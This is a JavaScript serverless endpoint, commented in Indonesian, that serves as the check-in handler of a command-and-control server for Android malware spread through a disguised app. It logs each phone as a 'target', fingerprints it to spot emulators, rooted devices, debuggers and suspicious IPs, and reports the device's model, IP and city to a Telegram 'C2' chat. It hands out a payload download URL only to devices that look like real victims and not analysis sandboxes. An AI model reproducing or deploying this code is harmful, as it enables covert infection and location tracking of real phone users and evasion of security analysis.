/**
 * FILE: api/checkin.js
 * Endpoint POST untuk checkin awal dari aplikasi samaran.
 */

import { saveTarget, updateTarget, getTarget } from '../lib/database.js';
import { checkEmulator, checkRoot, checkDebugger, getGeolocation, isSuspiciousIP } from '../lib/fingerprint.js';
import { generateToken, hash } from '../lib/crypto.js';
import { sendMessage } from '../lib/telegramBot.js';
import config from '../lib/config.js';

export default async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'Method Not Allowed' });
  
  try {
    const { deviceId, model, manufacturer, androidVersion, buildFingerprint, isRooted, isDebugger, location } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Hash deviceId untuk keamanan tambahan
    const deviceHash = hash(deviceId);
    
    const deviceInfo = {
      model, manufacturer, androidVersion, buildFingerprint,
      isRooted: !!isRooted,
      isDebugger: !!isDebugger
    };
    
    const isEmulator = checkEmulator(deviceInfo);
    const isSuspicious = await isSuspiciousIP(ip);
    const geo = await getGeolocation(ip);
    
    // Logika pengiriman payload (Conditional Delivery)
    let shouldDownload = false;
    if (!isEmulator && !isSuspicious && !isDebugger) {
      shouldDownload = true;
    }
    
    const targetData = {
      deviceInfo,
      ip,
      location: geo,
      isEmulator,
      isSuspicious,
      isDebugger,
      status: 'active',
      infected: false
    };
    
    // Simpan ke database
    let target = await getTarget(deviceHash);
    if (!target) {
      target = await saveTarget(deviceHash, targetData);
      
      // Notifikasi ke Telegram C2
      const msg = `🔔 *New Target Spotted!*
Device: ${model} (${manufacturer})
OS: Android ${androidVersion}
Location: ${geo.city}, ${geo.country}
Emulator: ${isEmulator ? '⚠️ YES' : '✅ NO'}
IP: ${ip}
ID: \`${deviceHash}\``;
      
      await sendMessage(config.telegram.adminChatId, msg);
    } else {
      await updateTarget(deviceHash, targetData);
    }
    
    const token = generateToken(deviceHash, Date.now());
    
    res.status(200).json({
      success: true,
      should_download: shouldDownload,
      token: token,
      payload_url: shouldDownload ? `${process.env.VERCEL_URL}/api/payload?token=${token}` : null
    });
    
  } catch (err) {
    console.error('Checkin Error:', err.message);
    res.status(500).json({ success: false, error: 'Internal Server Error' });
  }
};
